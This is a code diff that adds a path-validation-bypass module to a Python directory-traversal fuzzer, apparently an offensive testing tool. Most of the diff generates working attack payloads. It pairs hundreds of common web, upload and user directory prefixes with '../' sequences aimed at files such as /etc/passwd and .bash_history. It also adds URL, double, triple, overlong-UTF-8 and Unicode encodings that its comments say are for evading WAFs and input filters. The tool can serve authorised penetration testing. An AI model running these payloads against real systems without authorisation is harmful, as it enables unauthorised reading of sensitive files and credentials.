@@ -536,6 +536,19 @@ class TraversalEngine:
             if not self.quiet:
                 print(f"[+] Added {len(absolute_patterns)} absolute path patterns")
 
+        # Add path validation bypass patterns (legitimate prefix + traversal)
+        if not bisection_depth:  # Skip in bisection mode for efficiency
+            if not self.quiet:
+                print("[+] Adding Path Validation Bypass patterns")
+                
+            path_validation_patterns = self._generate_path_validation_bypass_patterns(
+                os_type, specific_file, extra_files, extension, max_depth
+            )
+            final_traversals.extend(path_validation_patterns)
+            
+            if not self.quiet:
+                print(f"[+] Added {len(path_validation_patterns)} path validation bypass patterns")
+
         if not self.quiet:
             print(f"[+] Traversal Engine DONE! - Total traversal tests created: {len(final_traversals)}")
 
@@ -698,6 +711,478 @@ class TraversalEngine:
             adapted_file = adapted_file.replace("\\\\", "/")
 
         return adapted_file
+
+    def _generate_path_validation_bypass_patterns(
+        self, 
+        os_type: OSType, 
+        specific_file: Optional[str], 
+        extra_files: bool, 
+        extension: Optional[str],
+        max_depth: int
+    ) -> List[str]:
+        """
+        Generate path validation bypass patterns for applications that validate start of path
+        
+        These patterns target vulnerabilities where applications check that a path starts
+        with a legitimate directory but fail to prevent traversal out of it.
+        
+        Examples:
+        - /var/www/images/../../../etc/passwd
+        - C:\\inetpub\\wwwroot\\uploads\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+        - /home/user/documents/../../../root/.bash_history
+        
+        This covers OWASP "File path traversal, validation of start of path" scenarios.
+        """
+        patterns = []
+        
+        # Define legitimate path prefixes that applications commonly validate
+        legitimate_prefixes = self._get_legitimate_path_prefixes(os_type)
+        
+        # Get target files we want to access
+        target_files = self._get_target_files(os_type, specific_file, extra_files)
+        
+        # Generate comprehensive traversal sequences for different depths
+        traversal_sequences = self._generate_traversal_sequences_for_validation_bypass(max_depth)
+        
+        # Generate patterns: legitimate_prefix + traversal_sequence + target_file
+        for prefix in legitimate_prefixes:
+            for sequence in traversal_sequences:
+                for target_file in target_files:
+                    # Remove leading slash from target file to avoid double slashes
+                    # since prefixes already end with '/' and sequences often end with '/'
+                    clean_target = target_file.lstrip('/').lstrip('\\\\')
+                    
+                    # Create the complete path validation bypass pattern
+                    pattern = prefix + sequence + clean_target
+                    
+                    if extension:
+                        pattern += extension
+                    
+                    patterns.append(pattern)
+                    
+                    # Add encoded variations
+                    encoded_variations = self._generate_encoded_variations_for_path_validation(pattern)
+                    patterns.extend(encoded_variations)
+        
+        return patterns
+
+    def _get_legitimate_path_prefixes(self, os_type: OSType) -> List[str]:
+        """
+        Get list of legitimate path prefixes that applications commonly validate against
+        
+        These are paths that applications often consider "safe" starting points,
+        but can be escaped from using traversal sequences.
+        """
+        prefixes = []
+        
+        if os_type == OSType.UNIX or os_type == OSType.GENERIC:
+            # Common Unix/Linux legitimate prefixes
+            unix_prefixes = [
+                # Web server directories - Base paths
+                "/var/www/html/",
+                "/var/www/",
+                "/usr/share/nginx/html/",
+                "/var/www/nginx-default/",
+                "/opt/lampp/htdocs/",
+                "/srv/www/",
+                "/srv/http/",
+                "/home/user/public_html/",
+                
+                # Web server subdirectories - CRITICAL for path validation bypass
+                "/var/www/images/",
+                "/var/www/uploads/",
+                "/var/www/files/",
+                "/var/www/documents/",
+                "/var/www/assets/",
+                "/var/www/media/",
+                "/var/www/static/",
+                "/var/www/content/",
+                "/var/www/data/",
+                "/var/www/public/",
+                "/var/www/html/images/",
+                "/var/www/html/uploads/",
+                "/var/www/html/files/",
+                "/var/www/html/documents/",
+                "/var/www/html/assets/",
+                "/var/www/html/media/",
+                "/var/www/html/static/",
+                "/var/www/html/content/",
+                "/var/www/html/css/",
+                "/var/www/html/js/",
+                "/var/www/html/admin/",
+                "/var/www/html/user/",
+                "/var/www/html/public/",
+                "/var/www/html/storage/",
+                "/var/www/html/wp-content/uploads/",
+                "/var/www/html/sites/default/files/",
+                "/usr/share/nginx/html/images/",
+                "/usr/share/nginx/html/uploads/",
+                "/usr/share/nginx/html/files/",
+                "/usr/share/nginx/html/assets/",
+                "/usr/share/nginx/html/static/",
+                "/srv/www/images/",
+                "/srv/www/uploads/",
+                "/srv/www/files/",
+                "/srv/www/static/",
+                "/srv/http/images/",
+                "/srv/http/uploads/",
+                "/srv/http/files/",
+                "/srv/http/static/",
+                
+                # User directories
+                "/home/user/",
+                "/home/user/documents/",
+                "/home/user/downloads/",
+                "/home/user/public/",
+                "/home/user/Desktop/",
+                "/home/user/pictures/",
+                "/home/user/videos/",
+                "/home/user/music/",
+                "/home/www-data/",
+                "/home/www-data/uploads/",
+                "/home/www-data/files/",
+                
+                # Application directories
+                "/opt/app/",
+                "/opt/app/files/",
+                "/opt/app/uploads/",
+                "/opt/app/images/",
+                "/opt/app/documents/",
+                "/opt/app/data/",
+                "/opt/app/public/",
+                "/usr/local/app/",
+                "/usr/local/app/files/",
+                "/usr/local/app/uploads/",
+                "/usr/local/app/public/",
+                "/usr/share/app/",
+                "/usr/share/app/files/",
+                "/usr/share/app/public/",
+                
+                # Temporary and upload directories
+                "/tmp/",
+                "/tmp/uploads/",
+                "/tmp/files/",
+                "/tmp/images/",
+                "/tmp/documents/",
+                "/var/tmp/",
+                "/var/tmp/uploads/",
+                "/var/tmp/files/",
+                "/var/uploads/",
+                "/var/uploads/files/",
+                "/var/uploads/images/",
+                "/var/uploads/documents/",
+                "/var/files/",
+                "/var/files/uploads/",
+                "/var/files/documents/",
+                
+                # FTP directories
+                "/var/ftp/",
+                "/var/ftp/pub/",
+                "/var/ftp/pub/uploads/",
+                "/var/ftp/pub/files/",
+                "/var/ftp/pub/documents/",
+                "/home/ftp/",
+                "/home/ftp/uploads/",
+                "/home/ftp/files/",
+                "/home/ftp/public/",
+                "/srv/ftp/",
+                "/srv/ftp/uploads/",
+                "/srv/ftp/files/",
+                "/srv/ftp/public/",
+                
+                # Log directories (often accessible)
+                "/var/log/app/",
+                "/var/log/apache2/",
+                "/var/log/nginx/",
+            ]
+            prefixes.extend(unix_prefixes)
+        
+        if os_type == OSType.WINDOWS or os_type == OSType.GENERIC:
+            # Common Windows legitimate prefixes
+            windows_prefixes = [
+                # IIS and web server directories - Base paths
+                "C:\\inetpub\\wwwroot\\",
+                "C:\\inetpub\\ftproot\\",
+                "D:\\www\\",
+                "E:\\www\\",
+                
+                # IIS and web server subdirectories - CRITICAL for path validation bypass
+                "C:\\inetpub\\wwwroot\\images\\",
+                "C:\\inetpub\\wwwroot\\uploads\\",
+                "C:\\inetpub\\wwwroot\\files\\",
+                "C:\\inetpub\\wwwroot\\documents\\",
+                "C:\\inetpub\\wwwroot\\assets\\",
+                "C:\\inetpub\\wwwroot\\media\\",
+                "C:\\inetpub\\wwwroot\\static\\",
+                "C:\\inetpub\\wwwroot\\content\\",
+                "C:\\inetpub\\wwwroot\\data\\",
+                "C:\\inetpub\\wwwroot\\public\\",
+                "C:\\inetpub\\wwwroot\\css\\",
+                "C:\\inetpub\\wwwroot\\js\\",
+                "C:\\inetpub\\wwwroot\\admin\\",
+                "C:\\inetpub\\wwwroot\\user\\",
+                "C:\\inetpub\\wwwroot\\storage\\",
+                "C:\\inetpub\\wwwroot\\admin\\uploads\\",
+                "C:\\inetpub\\wwwroot\\user\\files\\",
+                "C:\\inetpub\\wwwroot\\public\\images\\",
+                "C:\\inetpub\\wwwroot\\storage\\uploads\\",
+                
+                # FTP root subdirectories
+                "C:\\inetpub\\ftproot\\uploads\\",
+                "C:\\inetpub\\ftproot\\files\\",
+                "C:\\inetpub\\ftproot\\documents\\",
+                "C:\\inetpub\\ftproot\\public\\",
+                "C:\\inetpub\\ftproot\\images\\",
+                
+                # Alternative drive web directories
+                "D:\\www\\images\\",
+                "D:\\www\\uploads\\",
+                "D:\\www\\files\\",
+                "D:\\www\\documents\\",
+                "D:\\www\\static\\",
+                "D:\\www\\assets\\",
+                "D:\\www\\public\\",
+                "E:\\www\\images\\",
+                "E:\\www\\uploads\\",
+                "E:\\www\\files\\",
+                "E:\\www\\static\\",
+                
+                # User directories
+                "C:\\Users\\Public\\",
+                "C:\\Users\\Public\\Documents\\",
+                "C:\\Users\\Public\\Downloads\\",
+                "C:\\Users\\Public\\Pictures\\",
+                "C:\\Users\\Public\\Videos\\",
+                "C:\\Users\\User\\",
+                "C:\\Users\\User\\Documents\\",
+                "C:\\Users\\User\\Desktop\\",
+                "C:\\Users\\User\\Downloads\\",
+                "C:\\Users\\User\\Pictures\\",
+                "C:\\Users\\Administrator\\Documents\\",
+                "C:\\Users\\Guest\\Documents\\",
+                
+                # Application directories
+                "C:\\Program Files\\App\\",
+                "C:\\Program Files\\App\\files\\",
+                "C:\\Program Files\\App\\uploads\\",
+                "C:\\Program Files\\App\\data\\",
+                "C:\\Program Files\\App\\public\\",
+                "C:\\Program Files (x86)\\App\\",
+                "C:\\Program Files (x86)\\App\\files\\",
+                "C:\\Program Files (x86)\\App\\uploads\\",
+                "C:\\App\\",
+                "C:\\App\\files\\",
+                "C:\\App\\uploads\\",
+                "C:\\App\\data\\",
+                "C:\\App\\public\\",
+                "C:\\App\\documents\\",
+                
+                # Temporary and upload directories
+                "C:\\Temp\\",
+                "C:\\Temp\\uploads\\",
+                "C:\\Temp\\files\\",
+                "C:\\Temp\\documents\\",
+                "C:\\Windows\\Temp\\",
+                "C:\\Windows\\Temp\\uploads\\",
+                "C:\\uploads\\",
+                "C:\\uploads\\files\\",
+                "C:\\uploads\\images\\",
+                "C:\\files\\",
+                "C:\\files\\uploads\\",
+                "C:\\files\\documents\\",
+                
+                # FTP directories
+                "C:\\FTP\\",
+                "C:\\FTP\\uploads\\",
+                "C:\\FTP\\files\\",
+                "C:\\FTP\\public\\",
+                "C:\\FTP\\documents\\",
+                
+                # Alternative drive directories
+                "D:\\uploads\\",
+                "D:\\uploads\\files\\",
+                "D:\\uploads\\images\\",
+                "D:\\files\\",
+                "D:\\files\\uploads\\",
+                "D:\\files\\documents\\",
+                "E:\\files\\",
+                "E:\\files\\uploads\\",
+                "E:\\files\\documents\\",
+                "E:\\uploads\\",
+                "E:\\uploads\\files\\",
+            ]
+            prefixes.extend(windows_prefixes)
+        
+        return prefixes
+
+    def _generate_traversal_sequences_for_validation_bypass(self, max_depth: int) -> List[str]:
+        """
+        Generate traversal sequences specifically for path validation bypass
+        
+        These sequences are designed to escape from legitimate prefixes and
+        navigate to sensitive files on the system.
+        """
+        sequences = []
+        
+        # Standard traversal sequences with different depths
+        for depth in range(1, max_depth + 1):
+            # Unix-style traversal
+            unix_sequence = "../" * depth
+            sequences.append(unix_sequence)
+            
+            # Windows-style traversal
+            windows_sequence = "..\\" * depth
+            sequences.append(windows_sequence)
+            
+            # Mixed slash traversal (sometimes works)
+            mixed_sequence = "../" * (depth // 2) + "..\\" * (depth - depth // 2)
+            if mixed_sequence not in sequences:
+                sequences.append(mixed_sequence)
+        
+        # Add encoded traversal sequences
+        for depth in range(1, min(max_depth + 1, 6)):  # Limit encoded depth for performance
+            # URL encoded sequences
+            sequences.extend([
+                "%2e%2e%2f" * depth,  # URL encoded ../
+                "%2e%2e%5c" * depth,  # URL encoded ..\
+                "%2E%2E%2F" * depth,  # URL encoded ../ (uppercase)
+                "%2E%2E%5C" * depth,  # URL encoded ..\ (uppercase)
+                
+                # Double URL encoded
+                "%252e%252e%252f" * depth,
+                "%252e%252e%255c" * depth,
+                
+                # Mixed encoding
+                "../" * (depth // 2) + "%2e%2e%2f" * (depth - depth // 2),
+                "..\\" * (depth // 2) + "%2e%2e%5c" * (depth - depth // 2),
+            ])
+        
+        # Add non-recursive bypass sequences for path validation
+        for depth in range(1, min(max_depth + 1, 4)):
+            # These patterns bypass filters that only remove '../' once
+            sequences.extend([
+                "....//....//..../",
+                "....\\\\....\\\\....\\",
+                "..\\/..\\/..\\/",
+                "../\\../\\..\\",
+                "..%252f..%252f..%252f",
+                "..%255c..%255c..%255c",
+            ])
+        
+        # Remove duplicates while preserving order
+        unique_sequences = []
+        for seq in sequences:
+            if seq not in unique_sequences:
+                unique_sequences.append(seq)
+        
+        return unique_sequences
+
+    def _generate_encoded_variations_for_path_validation(self, pattern: str) -> List[str]:
+        """
+        Generate encoded variations of path validation bypass patterns
+        
+        These variations help bypass different types of input filtering and WAFs.
+        Focuses on comprehensive encoding for subdirectory + traversal patterns.
+        """
+        variations = []
+        
+        # Basic URL encoding variations
+        variations.extend([
+            pattern.replace('/', '%2f').replace('\\', '%5c'),
+            pattern.replace('/', '%2F').replace('\\', '%5C'),
+            pattern.replace('../', '%2e%2e%2f'),
+            pattern.replace('..\\', '%2e%2e%5c'),
+            pattern.replace('../', '%2E%2E%2F'),  # Uppercase
+            pattern.replace('..\\', '%2E%2E%5C'),  # Uppercase
+        ])
+        
+        # Double URL encoding variations (critical for WAF bypass)
+        variations.extend([
+            pattern.replace('../', '%252e%252e%252f'),
+            pattern.replace('..\\', '%252e%252e%255c'),
+            pattern.replace('../', '%252E%252E%252F'),  # Uppercase double
+            pattern.replace('..\\', '%252E%252E%255C'),  # Uppercase double
+        ])
+        
+        # Triple URL encoding for advanced WAF bypass
+        variations.extend([
+            pattern.replace('../', '%25252e%25252e%25252f'),
+            pattern.replace('..\\', '%25252e%25252e%25255c'),
+        ])
+        
+        # Mixed encoding combinations (single + double, etc.)
+        variations.extend([
+            pattern.replace('../', '%2e%2e%252f'),      # Mixed encoding
+            pattern.replace('../', '%252e%2e%2f'),      # Mixed encoding
+            pattern.replace('..\\', '%2e%2e%255c'),     # Mixed encoding
+            pattern.replace('..\\', '%252e%2e%5c'),     # Mixed encoding
+        ])
+        
+        # Path separator variations with encoding
+        variations.extend([
+            pattern.replace('/', '%2f'),               # Encode all forward slashes
+            pattern.replace('\\', '%5c'),              # Encode all backslashes
+            pattern.replace('/', '%252f'),             # Double encode all forward slashes
+            pattern.replace('\\', '%255c'),            # Double encode all backslashes
+            pattern.replace('/', '\\'),                # Forward to backslash
+            pattern.replace('\\', '/'),                # Backslash to forward
+            pattern.replace('/', '\\/'),               # Escaped forward slash
+            pattern.replace('\\', '\\\\'),             # Double backslash
+        ])
+        
+        # Unicode and alternative encoding techniques
+        variations.extend([
+            pattern.replace('../', '%c0%ae%c0%ae%2f'),  # UTF-8 overlong encoding
+            pattern.replace('../', '%e0%80%ae%e0%80%ae%2f'),  # Invalid UTF-8
+            pattern.replace('../', '%%32%%65%%32%%65%%32%%66'),  # Double percent encoding
+            pattern.replace('../', '%uff0e%uff0e%2f'),  # Unicode fullwidth
+        ])
+        
+        # Comprehensive subdirectory path encoding
+        # Handle common subdirectories with various encodings
+        subdirs = ['images/', 'uploads/', 'files/', 'documents/', 'assets/', 'media/', 'static/', 'public/', 'data/', 'content/']
+        for subdir in subdirs:
+            if subdir in pattern:
+                # URL encode subdirectory name
+                encoded_subdir = subdir.replace('/', '%2f')
+                variations.append(pattern.replace(subdir, encoded_subdir))
+                # Double URL encode subdirectory name
+                double_encoded_subdir = subdir.replace('/', '%252f')
+                variations.append(pattern.replace(subdir, double_encoded_subdir))
+                # Mixed case subdirectory
+                variations.append(pattern.replace(subdir, subdir.upper()))
+                variations.append(pattern.replace(subdir, subdir.lower()))
+        
+        # Case variations for Windows paths
+        if 'C:' in pattern or any(win_path in pattern for win_path in ['\\windows\\', '\\program files\\', '\\inetpub\\']):
+            variations.extend([
+                pattern.lower(),
+                pattern.upper(),
+                pattern.replace('C:', 'c:').replace('\\Windows\\', '\\WINDOWS\\'),
+                pattern.replace('C:\\', 'C%3A%5C'),          # URL encode C:\
+                pattern.replace('C:\\', 'C%253A%255C'),      # Double URL encode C:\
+                pattern.replace('\\Windows\\', '%5CWindows%5C'),  # URL encode Windows path
+                pattern.replace('\\Windows\\', '%255CWindows%255C'),  # Double URL encode
+            ])
+        
+        # Linux path encoding variations
+        if '/var/' in pattern or '/etc/' in pattern or '/home/' in pattern:
+            variations.extend([
+                pattern.replace('/var/', '%2Fvar%2F'),        # URL encode /var/
+                pattern.replace('/var/', '%252Fvar%252F'),    # Double URL encode /var/
+                pattern.replace('/etc/', '%2Fetc%2F'),        # URL encode /etc/
+                pattern.replace('/etc/', '%252Fetc%252F'),    # Double URL encode /etc/
+                pattern.replace('/home/', '%2Fhome%2F'),      # URL encode /home/
+                pattern.replace('/home/', '%252Fhome%252F'),  # Double URL encode /home/
+            ])
+        
+        # Remove duplicates and the original pattern
+        unique_variations = []
+        for var in variations:
+            if var != pattern and var not in unique_variations and len(var) > 10:
+                unique_variations.append(var)
+        
+        return unique_variations
 
     def _generate_absolute_patterns(
         self, 
